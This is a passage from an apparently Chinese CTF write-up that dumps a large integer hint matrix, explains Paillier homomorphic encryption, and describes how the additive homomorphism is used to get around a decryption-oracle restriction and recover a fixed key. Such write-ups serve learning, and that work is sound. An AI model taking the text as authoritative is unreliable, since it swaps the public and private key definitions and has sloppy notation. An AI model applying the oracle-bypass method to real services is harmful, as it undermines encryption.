<span class="number">373056357146783988324001261011290817990983733139928569486822804250969404663287810229094057517151508520325351979643505259566583255784308546671274359187540329810401789064405476120306086731580878687430571886487018022129970161122379763198933193393164082012874769856239153925184773245768999900007526148725685275215398</span> <span class="number">189151134426148278256409427071366413520188009676016079450677932819587006160588724353758434921769545666226931230267824305351217541812592065542758009713652120459530385929731704136259998404704062061516342696399828331167326571083479876669555943043053168047943740248299653029631568376909789939106248768517090647048144</span> <span class="number">240512512228719798356070959926466855223811682881052525290127024891651662922391789865967765496804085821110850993939702912837144062186314942968067803643004332795302193396404009082485618635264558073225834097841413081075677673516551306218697757264380114144493009296066239289151433414434039379017646061875649745707726</span> <span class="number">346912176048540452836334546034032960285022179236803788438251747480644343259868783485803477823211582731043628357050670291197009221306917234214679914252534326891991085563087599411610179740885924667596129961260429165752788601672169193829949202924835130279335075342143742167829496792703096448616636496760693010632952</span> <span class="number">331130373037972001102953031643382396979515964662489304624052488599160912795125160318234519866642862721633549672188701928861692419781039403840641254068539850798575561274690861739963655892301251695988981187925766294767450652522044825947072128307714211239079822531930197101207969937023517419925930409353825469456226</span> <span class="number">196704911547760567284050385731420674598076009873937693377568299640915328091276826164288794904728879719838179674854608315870562759589598280794236610105908731802053119302919824057716122846479842474006011859073682756262425348588662373737717717809493704161975650796417793773383864926652328614176077844057491179246910</span> <span class="number">288744198187345908570426813950261730896271408792096129336472163819416730502152105449025428248211255417197730015467772830248900326002936441227960684688864722516521525191672054152484703319784200271826100588335140247721191783466829259326414039557724063431691211227913699402111511918673142833813709806399089806975546</span> <span class="number">314160223766452128579861005172671000313971828439735851393262164809908257282848874122242764968523201114287538447091690854508720803096513486245768971488677977869350339315428637361871338292982643086514218979033892662963486391741214111508994566591061182896746561270891596005443031433846504367118107622229239977276052</span> <span class="number">189314236510821958625445430297109310134459612061711583414604331893732423721978047783341627397557474990718081085631468140162397553785849716100088347097532996712406961145718960009877973385090750342652920674969693743369930774328443450698143101676309961271021142165188231029831485825620637611121566388434213441041096</span> <span class="number">227639552218697766618035615326387746026843650066567132578875508883597082357592196162419744534440656044550494746125485842331141490201209016484918296246228621704119958599025229284474910953153640550818632543298036010211688361274429640306899078083556482685291746437500121569910687838704588261871609562916512113037410</span> <span class="number">341621018888240518807088960299048188172191849234245240565461351612311451713088355317382498839718740283303487813712545677438538191672307052718249730232826087575245580972526424458884227978317230336839594003104736635324065238353876804896463305487006586573048513769652818984397716990022803444704505403150568839937138</span> <span class="number">216123077597152132543630670055269355562199345931984977069037529561514448756215530084689405786635470262971143013769794858355361684212611373725736278526814079560912323372074535977186754304069656065912163601215527606484677744091044035587999329874182822695884930958986741304204631893956526941198447873806112347365238</span> <span class="number">350298204021132344257659928097604044921237222358378927732052872008584412852634064984624664344363578873080685686411093410611433994933116392788378589446822611880527091025930422852170519748147209094085814437888383833134133192292228128381066537995036728067660581836663906430414686433434109211476345307877724982369566</span> <span class="number">200569699342686680129903260344190813491599875824275561995415417992992364171175737877630396237878781295169082420288201968428809514772651346528112268662588646610825249833788236333925640063619265380075700566826814005955004973364289204520681989309350580566136586613470414932749986618410222681347403338516521993389274</span> <span class="number">332478634383163276191514436654984678626644628860495401127847164436988350622884185489705399320379025473215204548604537140222014597979209029412807609351867634340647611957419248676258721833190432147074075941996333693958169415292190320714238628052320125734309181334383282887490511035825947758674019710633863920336336</span> <span class="number">261481571288761610800515150486239610090331881249174640784108800313694626026841178466448957106989246864194399955219765857389028396266490104690730233453940025110318346160598377268827783341728983604303433320271296118655344082911605622359592868855357966088669746859470179508992926751243414162275611424954419765271272</span> <span class="number">271526861887128138669968046830048945304754693071589434955478245894201567706163208390117728390086337577629494954350030139407920028158811011700108620515049210346381025264312249863553010933610047283708909822728743415380489856722999944947873038916850860460362112591717191847137387215708856093149926440860889221400378</span>]</span><br><span class="line">[<span class="number">175623149805053197861616427683048878592469524974820452081294531183708188952375657046874812938982110631942350028046267697790338027114302841970500843978963469894314503492642840507622494347676184175962190032164434594555975061352399167713874115936399166570170307250393157272582473779794429786721454357428554055159828</span> <span class="number">246472611436373388239989661262173930524461618600029181504765699614474301970276617977851330684035970342072431179147767677367241532556896669908885117835754331334843727517471410398500159811450355927016592764707924286251133211055134972060347454783378181405300582327936758880369170633433008223405702509773222249658771</span> <span class="number">170377117647133131861289078713069922178957692045903085485564629374697887248831319867373965890439419910888947304840558380439836673832114066395431739843608354832983406132258122150538490567648312137683478888589773810236335287424835277153061506075401034916105107183827331687942412766694195145073944164864786465418793</span> <span class="number">318880184470507855794337241625696100876255739459264701724373627359616961808074072150679547673649825042488879425799140386442963254577946153120439178044973494562563957793474838949737206015100240847360824935865463095332048802516593999858232740720853073685342567934894566050276362805521406320588908095085794437655518</span> <span class="number">170877188206950702651638691126547231307661997097691500999883172125449255821553387294756734615448405424267054425178987576456044259468078157017008218367575690622832151059934884069768859955396839274914542608568258587793577885498892836078118559208149330317305585424678607528177529820782274439777715575337461380706616</span> <span class="number">206063782701414601378657104339844733567076877340250596380188623480511149894410345740302523035013420807252174879009909465492848072324709491924842595528733544155095032521446041004004338880847069376043875548470405766831552295017253969018349754977643264961787752465568281070481540959661907998749354350611803463427194</span> <span class="number">296902855337610822083670637491151564796725031836730507640114579121100759621016835208167001121556790196308667848787977067269971514621628384560398865788176665093040101150549146216915078889519516752791380364048646955401968897448644344227182351887267732056428733969213082815254850806687946171726768790110167709536447</span> <span class="number">288696280164728236166908851041294126515119598803028148975577739092543353072122368433038776520382101061701416136805797803029422344214691012190791756621766050907284654673202454318182027043589587147268298815665800645728242296352078713078969982360873210164364082622944104383788870742732002742431888753904166580845956</span> <span class="number">165736203294259897057860224941109788933753304107990451347556498450534345580318965824916311089496822921822336271570417438683256020041657954189552944520698938307096708718845505202544383230308227719320585778589882295006065300598538148699629449664102808980309933467806190864687514019591877476401183225646367359357939</span> <span class="number">249874714069496977802858983978269755231822334239693578113242758698060987334899957207653349381137467505217559841886198205698656243173634161018849158180165883314829935431977687561072757393068458812258609501850265110222383324683109878654345581064693931403813786926227157909942436884699913315358386420391348425202730</span> <span class="number">276185091021460126251403464203383531551270101223734429360714029909700118803908402648136835802798332818146339309387084338084778767840523849225812815989953543896488350336682093621179992593388836302388290066064653209415361696422734628833111685768822301310847196850362475040891843431422987423098238410429826347141057</span> <span class="number">178233425293726887379122401536860120178322308260626893660118992348808245101362815377642430952905493472258494231289246843918056624766587890675725838663192213990655769602268958410473789506042922545222536788380485727577290212477546807445792687920398621489120123019615942748507441603362226862253853822543116545385835</span> <span class="number">201318770379458483550884351829608639412343961437945452007135216858525000422747657723793875656466500557967284959547330862427397103520071968294206351756171979819157729166406831986566429836134587979891990023336453264404803183826997290507820050176872113724842252709186034367140199197200554850923230098368528091354727</span> <span class="number">275101003478066982297142226914802638801476022302467989552456610713198223325752945551523797097038370080012893545660861033428714922218051655619133103597797529647489096571635032556150305695917870642826560961039081483737278079868058119617191905211025704037908969151296010716469170979254288869817419337172909965664385</span> <span class="number">191249958163947446317734469465421081643380085390691894717888542781495296693984620850729830426974507061065442122276760345379784096335904357269709051257814975371286222262605797484327357943942136830524081458036826390915006444835238609374930032884999988873539314866370053141151568231199795915419316787054184559941630</span> <span class="number">282956767685374732684255505055321721541404064828514007992198656321848213210108304752569039041858075019113865418514589306981230705124516257723815726304348813185430791760354942068520172912031833198724227892758160303874210781537582304401386959233136874198846566732881678510136605198160541154389924372493390566790348</span> <span class="number">176674189063647946166661855123364607063564837999118994435761167829387950465557500962172651416083632955175717252656085414817120885100783500674404865386260348794097629591012031742941277217851738968060839882480813976573845233225224918480042050569618479847752577956637361266229050642559205888548899935869529919789287</span> <span class="number">293629454439938675665246149997295229780540641224058348104467608274064565127389468481157539830025313682073189415697778733776823698579272939265657643462398039106586916514045559978839231057880657927816845504452419329255147403629087612138586386196491856547187734111017683784372399627157138963836461318222943418486105</span> <span class="number">214682330124308024533638289687908875517563936766412556789208137260848655527240791264786452120718235046960492471701781470115047433128288077827315908726921960700779371308425360277049728613242474818106770056751163305492738270320109661267437252899321241565992339289983249509045957363772431428834812448408764831008567</span> <span class="number">228022702864658988969129022620419283010435522655071062902293956079551522596246345831856235014806281948127943570821740330290263903929956923207512216200564168868549687871485861205457540731003277927306702487900947751779614446042211492488056556189716450536869314181576767095238989836140137514924414849863116384707683</span>]</span><br><span class="line">[<span class="number">263802743125065611854663706068826473561435130056041380581155630159114016161797108738656054337301552361104745501626297744633677998346389065885445645225457392264402685256446732617410915726199518821525714030999876001288222121346036166521447173049410694650991543915554892354947398312698794503377416461200156805394371</span> <span class="number">320896134423422574520240291349147401639165979146192371278439880236522964304051823480657847175591625518422085492381476122103312288655761052752873859442484769169558817241190828341156841234335477900521098762932369961822782795332987578356546553091129465224263619589247264313390916497174987642177073698938428902840770</span> <span class="number">230464972367479080091313350804632442414768036789683466924014697404641380950005377670596402791035596590047124322259265099437564010465193833824987830791614121854733402779045590771445706674507821069394743283382958662653151758735070694245428140605405921624590397151426686885032916820611603150033788347481218566745273</span> <span class="number">421261585084920182446526495116643480392730469743827862006216040691491037160349188404172456435796440269635067480312266243739762324986305046947862269526406642811474224946858743837123817349029135138926502157998094768981502376251415436206392989253122792087156371410523822026858140041260169395691454120077192521149849</span> <span class="number">185418536811440205699072355965719607122795550862289332526528552739801300951966026705708542480834896336207347778790055231810444767897930754793773163859353636496571221348155463841169805294550379893738848892918721076975081924623189390447191060248314140980281056389234837461879760635375755455911003842191792795699836</span> <span class="number">222949724559345369515876742376324208474209224401745813603650618654941067496891076969113387600769334247281133503335610185231877298699232167392913882548246585496460081945346996617879304918670432568357795704162111628133186356553020806543056111488324767104871563625990468493103277705324264277570952424392190201115938</span> <span class="number">417249053603668860398638007724313631665518151980453893200754456866793289926569742846593268065826968812251298412432228047579953515503978207959604779316946038737170598679761205004141075158189151106860397601785647200476690891680045886950663791354463313670237037104139315333948309323177215513136677962596505855724482</span> <span class="number">380703131258698442484257295705282460138459501506258587963804780147303689301498863853181114417387375260509713819428913085369967503012855131562124116143919603142878461974086212048882400470582722117027508918953850900225592332853448851076539375095239472294957289814520378739330818569447425759157258662686334253355500</span> <span class="number">174769482355480588345311613010365968105647777227983215629383135386253956970539798754553852061207843036431767577299073223868970306308504095596195583150625655494261586095058072743229891433474993939942398453442773226310901826479117219151788620376072999054073000931518253447386312127143793652689063987632256694644897</span> <span class="number">327164800502570111999255169062214852289024650041204000955392696812938650601633308356122411433015318582625120285841145363750655096696094085909404926864951469926527492900081602416299690043335910528297439260535586701858449443390263596697025175513931804810020282888341740518192698006322684878974982369786387253681316</span> <span class="number">276439838719650764488760706539413808941389453025425230737995344354680683748291159898514158071497732848802350556863341028359281838520453819661935776752717598508065174375624156487099823622160156401934005153049531524751416677363022090927104928829311418942258423251999433232422284391368310998233207512721564461566556</span> <span class="number">212704186544971246222074331123597727663763455268551960984096797016253016572607107738345004231955896971368977347100937140263521419465021517581645826070200344547730659859242952260350574881399238499262239129867333898104370883831229865121085602266005715278431850604432546565292403574347428963378485409396018837106565</span> <span class="number">231137422991648931025191013127711640031515047110174466235597219684768405973493313199593637448742237427662518543563796364330721637222614008904215424565320301609005142351466971837943478984805812334326839891442190086073513302604672100631364143668945324150473253860772189723193828633877450731413154571181731485383640</span> <span class="number">346852671310986416620268341370428386760027918834948503130669645512096062908498635870610732389477638337172232861669770690949699384690517861680456761451942282251505556444345558964135302046566863123223076364168217803125255031661692235457299179688870858823807648198125758577241371873680194439823200696888713230902212</span> <span class="number">287263520323336668880280185765643127589437972686582801399161589015314791815648075056207418545231544009174107068734307569837848323966298363454768482796027048582738173591634259891835449428405948869830133193571961548167133122964174404800246571823699011968363185640067441086555205137097354790780403579717485627270428</span> <span class="number">329883055861881025727591665236381807383719074549752885591622161226411609685765134394593157735189825832630380022491502237968886970250397907315413692303541068768129070878124619704366859263263954300306812557267687229123228539052606395691784049866558707964342564260464000612180076523125192753373680388269270251292093</span> <span class="number">201692153923743022227927922047012721514180108981353368638070298812204958616153080716604722976256960296951889299093183379416088095323189536529677512957987101520044081457825018058425104385133680831223186160753040038771182132856411426923327440105070960271874601546071354133543964253783054427578572957912051207772513</span> <span class="number">354771700675583689488569097633266345033034292834823785723176682704096136540587857424377104859410919264303365927838937302098461729381745740962742266932049996634084571342813380437030001692639691503587914683483656386548814219223701731884065962930763473181936744247429314463543439726422938526232536731130027472637830</span> <span class="number">230943984818628219775424803943028701981262887753550449093347433635463647762108622471462562507767132209632555402602466878568574695007510860318898140196565498149897379414874244619642393298505525196971748179327488678703246568095898056962050502886150246314565883735935819566751219493409162211248339527899412213120834</span> <span class="number">244910871291180999540876131038224678232782647136061474463687643873084543167227132404515719210986376277025566516062270578690175262957119201647454438547850156698437789055774160524029594829257639261357142899164701080464003135214505418613322361259961533744317674692792378760082345835178991716760837668321047070430650</span>]</span><br><span class="line">[<span class="number">231102540504208683441278500770895450337994063758279044260909792393698116506583800640851716359612166617240329487078459778841086713848195408744926082983916425830805692662231680741038932462856578954369707740785537756521479763236859696269883824392264522940260726858607980820451940360570848863128174773820966893542712</span> <span class="number">265743734539653579066835004687831624350083553970235027604869801864636417556415826517642636904826103365256026528700260782452262279883815530182066276024124685278906142213910928844278925366115374824819693956067870537172894170375835301853399595095899259427582434932770426845870293172991775662360978643716901645727620</span> <span class="number">210349079405696356836538429147292337140360379103893119806144305020385537810464131226110659619069825547042724403301927985448569166987375224344116671622639914313998860456344048567428725234911738633657245695536663944656516106445205837360781053063252827728226509266208429994258965053096885963127408584682983838548084</span> <span class="number">370092127898495881883221131176739243404828188407936324478335445617644816968311072375693897341700102453800936942469264963561739173638500247105996819894999098733448347624476545606461484793983759760189221130816420100595493771321881846212596470412808302539426346257544008296437757331559126525153939418649272581792003</span> <span class="number">155843799780863429380712206517786331534603283457507603179350757031764349002066382081296339893951785831207307434330926859216544592273625218287709253187474640563451801142789872369433700787170933202626495936868489194039759368130295796694222122781856473407481019062743764408613678191642331547280835219937956830086253</span> <span class="number">208685660430718063023134818029600681694016927117366633238131132958445192019428111787150807087651421606387641544353440933789696906455720573039977965313759451536284368188362063603542263229302204204759430462874611474874693438431550965726670551232667004605117637529486443639284542463827061463666813013146069774596623</span> <span class="number">376495416003518639674417499958175701281929854694917681678531789462561603655488327795424699227219006166599077979577816057057415815525993272616746606687608525956800712326556097990469731933725132735734038748976627488163875926676975364618802603834953770499093436489566086645238136752039949240162647636828987179834579</span> <span class="number">346799239413999488110498971912233459911177299861483583332921749052093930592747061842509813134949357072475802378493682633518872240913782965807261631327544141893983294043896670884763376696794350429609524179289465879806052942382457120210869053530047151528132036231308034634997696854219478164213710400852077248821120</span> <span class="number">169705981594055626191526129703854602873762809855971515772741441032501696121273578085381028584987027704846182419400909557263824386366943105526662769950004781705890276127517431544466618726548271127228276365582823372401537605732731021620104320190337969973584939402421466369627565469352767040352557329922040477005195</span> <span class="number">314939568863760290384540118082752153809732004758279668349154520117091144948135424245524366340063324424008929024207003162245020293740471292239566910120785826581236198268357366087675220099414793533202441187685322391483201816424704819088053895597092471373867194127053233302646141670296885753306292240050902882067193</span> <span class="number">274501944416882995735758799555202391039362923348719225643877708282924068365040664503209219610043149528435249078029298305750485892232308481502453379425972726421550496575359608190796610287241500978967423412598029333421297963696957974765793580684264457336896386351474306901474091451058371162815205889658547288756613</span> <span class="number">162042852002525722516821528383186018278575449206566435454250047908141061435368036746325933601126615024491314927660133760096281320705776102244655820780663122601103393383949947351281931199892199251850719799714623843639554360811771032929325708611802494168688704327872997885604422684877382926752998081879550922673159</span> <span class="number">199186847050874310663711759065373319818497267251671468587770424206352468442476247991295451181041636866403183712299615853839562933931317404502686066913393985793556698127304344410066576991382378189507028571235204890091478641432426168888625939898268292807620365706172657484050320408998105779117927886741609753059306</span> <span class="number">354256837940358751229028023821326933124473022943665368069235748497806815006951251158634725639701700571512263598986222866058897650192202830132245087410002342397999093293483377281475490558826621520353888584868610041332064027926228150805277127860712298027363127401797551506511822135023888887056550951578462666401168</span> <span class="number">234330939937018332512234165522950453367160881291461134878469921151439507789729630447378709490321610875562768524667352209340414557186328790809853587586777294529691020063694501014064937325044229606219932489176634851086737384369314067274741216128951324322584695745812899005951037076673803633700002116900191518343104</span> <span class="number">332082029558565597759771105851214333635988265232527004414362567577413617394351558271692150498317158739732745705862594401942142069495962667568131355700265663419672348704206572928190457355848914210638948420335608466079295180163933469063321924973352389720524124550782071251683357371242157306460292201842796159597718</span> <span class="number">176986136483895554690418327829140706363382659137667608820689582879245220579777187328490743894561014022554001750978511533817549261532456394670700292294046329085693852890349308569443762100181849446497355153201880907487440309844376681147420667541370307460264411327087925505905262620386071002765983602129410981524825</span> <span class="number">306033578065708181892360605636488380307220653372422877388073952287817583833546967101487424935952427752988503478955261900401084739761751200955335173846876897288478246027251747140227411624609094450221789960283358822393959292926844401039921802250862735005064118599109755577207049891717698360790293581097903491018814</span> <span class="number">219314874918300986481829428174736339804584038904721479645481695499805419784152647017619171604955608496067000760324205776683331070846048793475354613648011507848178533546104483200182624615627611831889147775959481609079024343665913206339506497470471534463297926880205982018469713052772296925382623211807447844984467</span> <span class="number">251411658980176426424599861269457962905360409027060289781517026051694351718496780577508779445417678245301909030308343439327126522122700289297564268748528240372257642080980189466101294410540270453169210457925553360431225739589139247809993207475957612679571134629233136065652272322414452523211844945796568973495999</span>]</span><br><span class="line">[<span class="number">241061899028073988798790037741230393483942234086601336070745000327245876506533109773029357915901349628815872451441889563829064856413873527725718859869880048269099752637807588068089888054068969364294640041411106036524096059153691012518740485034056356062246082921852430278113420285101114711615424549249139277257522</span> <span class="number">324649731643599086115112993009519699452138031914097657036589002455757996538628271536312086027891113179012194983336641812429479724987783015151964019081755404469480800754838022457743380789954890634612176691117396518047463228921056260150822618165077435901312097677295072882034763535523532942532204433934684610043981</span> <span class="number">235254970787462219840404579655013559873788828426903153698865648656984467361490822488648895501016091744753460386479405178156171138845774327715705113786912265599410014203748341886209366676022693408156368163002599405494601590496989401198973552929276456687898371994794916975190041122391592774191440696356717294231885</span> <span class="number">425740880045791532523198846621983282509953016391567213186903868019913918759794287097305752661999887010700707627995323212438864509866508575502091321511540826163355631924563516051145246887413009375239895267200500759550085778323118221354084194236896509274319680974593889376664049241305285099994139673137299475989239</span> <span class="number">218691513540400821804549224498219066538131669904044585243726742849147890707633382757651080960290835528290337948081051248880519870334888312880595453864524810424852223683875213593288669664284711136053455521502919177926558970455107382642271908290895517253209256467433830518046957366395690737578182144983590102038485</span> <span class="number">268302619218865130271719033545009753399779053711844155079138523469992700794733191273489783510080694015540326749356237471601952640624690574647332040161941087090977941149395995577883320516589414044570632833251347023576508268184788428567463591494267298109046818940098510550915355847388894041086742208584657569920241</span> <span class="number">407336383942338740798174626239389115510448736801033328217610646742146225826124003788716755725647121531842265937484525828476656038527198785623700663154028773955096919034338929692107410713949725783634901653340966038961119651080922944892272587766538064084646021325484724541568127313549775873739584827773006445753640</span> <span class="number">393134681808112694975913596160448244240482981723630973356146031804916532236941181457510899673572218259277651984203628914738756762221755837644731654303750753476197281608744739922590010615338565608869292496306096877052448883659921270645325450515812730222672889593367986446631364900471069472193722736474834255002036</span> <span class="number">215985610462350960536839616461780541805901325846759115271248048215287698136361487020004528283989079601628886641948076104288189678081611169093333207280398109804824624795771554170650549004098320777411071055885304220606333844107189337640129908960147941269202033000097270450548214871844613318043993706884193566592242</span> <span class="number">346257259037055528063958283678684887823288869097971263870223136112022875717777736826173871208586562198755058112840232705464980999720904563887473827824133419842768406438046339340339959582840029978504197963610308123410599725432433522242213697754185538704211639401044451536292208819236994660059970571914124114271599</span> <span class="number">363246746808596148737210992794327846617357056818891810187521430179806831944113701788410216011602199287600811660665546421846554242509136889853836816039021455766143689619674758256794863013934396056281068369903404163406671974420976176790079516456790272028047801640717669827329331072466985218901215709420185800516476</span> <span class="number">228359797357492684759272370677578475406914608085297270343294942217355808434075355292324467198813215227688688362769136317178109975711230089700653102174151262564835348723399701993261280133408455332578461475024635686745323218522248731512202235490816229580164661361372292890652140155335039766689335306017058323699870</span> <span class="number">261073525188914242692884720274275113790550147800012726232648813501113485629042787747610119742164958912877580849092420435073309574603834046313181794097664949615030331077619160759088825143525257977326603290777510448929918569695246869201664075528458430758464117802684751708437328671301437881253087978552349557929227</span> <span class="number">377423095994193204578922189550375597310060100452415257679145216869152987932295320012532627260082665449818987730073474556374560322751066241641707700730565368688246016131410970218689748683166415305887428221617894893227940635682372402200646522705710629106816809097492815206152579668106759027411978172342124297112303</span> <span class="number">259137995605024246569067807228464978520111212301361385815260982586344554863475368048854803571456089002898762700215696227544178787894944543608617271366117854871387117184290022561543196044929075487901413409938350861993081883369167887211440599019001236665896078599620016292614112682026683285287944667378349567596682</span> <span class="number">377895600401386832627207473591231966722427474471978045257286932968025516883841438396371773330379400989122373108094619359580992354022500428350148393367120309907862372401833632609379756774123183371656856319067036230164053711297648196590505716602911948600987377951831975851533902097405199596765482628047101483695180</span> <span class="number">229923888278321507619955308253814201187825646322202404258155581951646311813859740021687863337140515937531198397962741508305877398164540330415865591188990653875351703558714013038074531074780496846384342682480155793583956273003471876034817892417654830968846443801102524499001760690758196360143326941316313005428764</span> <span class="number">385146020849542828762376295678872983417037260032909849077585933133727150028194380453576167080843313823221853494336578094737485648365841025909075506522610021346056261722697685735150058706447775324473174749709672319355587113103471390302308032073417731526776326495675395951587591860727897765554614275689077980788425</span> <span class="number">276479395595285600707058522756048895783507186318454062608303747878078415416637508566237782329945122675299190201507390456469318457913011040396520935462671813934491352484079874838580577796640954416628460793482556447364053471884684684531093453142733820253696024739578833329629972259929828470255438392962899864298928</span> <span class="number">304113742334779824637859934428402926505401880740389378433569048603311596599826036448865299394425292925430829973661203201761633383418875016143497844450341141334585646363757368824123351511948673572982552037453552797655001298458947196811495751443435574229011561264850603574487599877204387001096835704274170180520128</span>]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在一次任务中我遇到了一个challenge，我的队友给我发了一个他截获的hint，你利用这个hint能帮我完成这个challenge吗？</p>
</blockquote>
<hr>
<p>先介绍一下题目中所有到的Paillier同态加密，又是从la佬这边来，之前做到一个GM同态的，<a href="https://blog.csdn.net/m0_49109277/article/details/119841199?spm=1001.2014.3001.5501">InCTF Gold_digger</a></p>
<ul>
<li><p><strong>密钥生成</strong></p>
<ol>
<li>随机选择$p,q$且$gcd(n,\ \varphi)=1$；保证$pq$等长</li>
<li>$\lambda =lcm(p-1,\ q-1)$</li>
<li>随机选择$g(g\in \mathbb{Z}^*_{n^2})$；保证$n|ord(g)$（不懂）</li>
<li>定义$L(x)=\frac{x-1}{n}$</li>
<li>$\mu =L(g^\lambda\ mod\ n^2)^{-1}\ mod\ n$</li>
</ol>
<p>私钥为$(n,\ g)$，公钥为$(\lambda,\ \mu)$</p>
<ul>
<li>通常还有个简化版<br>$g=n+1$<br>$\lambda=\varphi$<br>$\mu=\varphi ^{-1}\mod\ n$</li>
</ul>
</li>
<li><p><strong>加密</strong></p>
<ol>
<li>$ 0\le m&lt; n$</li>
<li>随机选择$r(0&lt;r&lt;n,\ r\in \mathbb{Z}^*_{n^2})$，且$gcd(r,\ n)=1$</li>
<li>$c=g^m\cdot r^n\ mod\ n^2$</li>
</ol>
</li>
<li><p><strong>解密</strong></p>
<ol>
<li>$m=L(c^\lambda\ mod\ n^2)\cdot \mu\ mod\ n$</li>
</ol>
</li>
</ul>
<p>查了点资料，问了下师傅，稍微验证简化版的Paillier，由之前学到的求<a href="https://blog.csdn.net/m0_49109277/article/details/117909339?spm=1001.2014.3001.5501">欧拉函数通式</a>可以知道$\varphi(n^2)=n\varphi(n)=pq(p-1)(q-1)$</p>
<p>由欧拉定理可知$r^{n\varphi(n)}\equiv 1\ (mod\ n^2)$，带进解密函数，注意二项式展开，$L(c^\lambda\ mod\ n^2)=L(g^{m\lambda}\ mod\ n^2)=L((n+1)^{m\lambda}\ mod\ n^2)=L((1+nm\lambda)\ mod\ n^2)$$=m\lambda$</p>
<p>又因为<br>$\mu=L(g^\lambda\ mod\ n^2)^{-1}=L((n+1)^\lambda\ mod\ n^2)^{-1}=L((1+n\lambda)\ mod\ n^2)^{-1}=\lambda^{-1}$</p>
<p>则$m=m\lambda\cdot \lambda^{-1}=m$</p>
<hr>
<p>这就要引入两条性质，<strong>RSA和ElGamal是乘法同态，Paillier是加法同态</strong></p>
<ul>
<li><p>加法同态<br>$$<br>E(x+y)=E(x)\times E(y)\<br>$$<br>取个解密<br>$$<br>x+y=D(E(x)\times E(y))<br>$$</p>
</li>
<li><p>乘法同态<br>$$<br>E(x\times y)=E(x)\times E(y)\<br>$$</p>
</li>
</ul>
<p>非常好证</p>
<p>比赛的时候推到由二三四步求出一个key，回顾一下</p>
<p>只知道c1c2其中一个，直接用同态性是出不来的（可以试试看），必须配合攻击者精心构造的发送数据</p>
<p>根据已知，假设我们知道的是c1，m0m1完全由我们构造，最小是9<br>$$<br>c_1=E(m_0m_1key_1)<br>$$<br>在二四步分别提供我们一个解密的机会，但是第四步不准用来解密第三步得到的其中一个c，那很好，用同态性绕过：不准我们直接给c解密，那么我们将c稍微变化一下</p>
<p>比如在第二步的时候我们send一个2过去，这样就得到了D(2)​，第三步m0m1随便取，然后在第四步，将c<em>2给send过去，由于<br>$$<br>c_1\times 2=E(m_0m_1key_1)\times E(D(2))=E(m_0m_1key_1+ D(2))<br>$$<br>将c</em>2给send过去是作为密文用来解密的，那么得到<br>$$<br>D(E(m_0m_1key_1)\times E(D(2)))=m_0m_1key_1+D(2)<br>$$<br>我们知道D(2)，m0m1也是由我们构造的，所以在一个循环里面解出一个key是没有问题的</p>
<p>比赛中的思路到此戛然而止，因为对于key那方面，是一个矩阵的乘法，我毫无头绪</p>
<p>在复现中，我看到了<strong>关键的东西</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">R = <span class="number">2</span> * random.randint(<span class="number">0</span>, <span class="number">39</span>)</span><br></pre></td></tr></table></figure>

<p>这是控制key的，显然R是偶数，所以如果知道全部的key，然后将第四步我们求出来的查表如果是偶数那么说明随机数I是0，如果是奇数，那么I是1</p>
<p>于是这就有了我看到的很多战队WP里写的，利用key不变的机制去重复断开连接断开连接，不断炼丹直到求出所有的key；确实巧妙啊，但很可惜，我没有注意到R是偶数</p>
<p>但按照出题人的意图，这个应该是非预期解了，设计加密方案的一方完全可以将key每次都随机化或者R就取<code>random.randint(0, 79)</code>；所以还是想在赛后看看有没有通过hint和key.sage来求key的</p>
<p>先来看主代码中key_gen的part2部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">_key = <span class="built_in">open</span>(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> _key.split(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i[<span class="number">1</span>:-<span class="number">1</span>].split(<span class="string">&quot; &quot;</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(j) <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">                key.append(<span class="built_in">int</span>(j))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) == <span class="number">80</span></span><br><span class="line">    <span class="keyword">assert</span> key[<span class="number">0</span>] == <span class="number">119</span> <span class="keyword">and</span> key[<span class="number">1</span>] ==  <span class="number">241</span> <span class="keyword">and</span> key[<span class="number">2</span>] ==  <span class="number">718</span> <span class="keyword">and</span> key[<span class="number">3</span>] == <span class="number">647</span></span><br></pre></td></tr></table></figure>

<p>从代码中我们获取已知条件，key是个长度为80，且元素不重复的列表，前4个元素分别是<code>119 241 718 647</code></p>
<p>key的生成与之类似，顺便得知key元素的范围</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = random_matrix(ZZ, <span class="number">20</span>, <span class="number">4</span>, x = <span class="number">100</span>, y =<span class="number">1000</span>)</span><br></pre></td></tr></table></figure>

<p>已知的是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">hint = Matrix(key * vector([getRandomNBitInteger(<span class="number">1024</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>))</span><br></pre></td></tr></table></figure>

<p>$$<br>\begin{bmatrix}<br>119 &amp; 241 &amp; 718 &amp; 647\\<br>\vdots &amp; \vdots &amp; \vdots &amp; \vdots\\<br>\cdots &amp; \cdots &amp; \cdots &amp; \cdots<br>\end{bmatrix}_{20\times 4}\times<br>\begin{bmatrix}<br>v1\\<br>v2\\<br>v3\\<br>v4<br>\end{bmatrix}=hint<br>$$</p>
<p>重复做了12次，有12个hint，每次vector里面的数据都是随机的</p>
<p>好难啊，非预期就非预期吧</p>
<p>老师说可能要用十二组hint构造格，然后格归约求解</p>
<p>下次一定</p>
<p>总结一下，这题一开始我并不知道Paillier同态加密，更别提同态的性质了，但是这些都可以通过搜索源码获得，所以并不难；没有注意到R是偶数，有点可惜；总觉得思维不太灵活吧，但也和初期看不懂代码有关</p>
<h2 id="Crypto-myRSA（recuring）"><a href="#Crypto-myRSA（recuring）" class="headerlink" title="Crypto-myRSA（recuring）"></a>Crypto-myRSA（recuring）</h2><p>这题看到很多师傅的wp使用二分法做的，然后我就想复现下，然后我发现我的理解稍微有点偏差，后面会讲到</p>
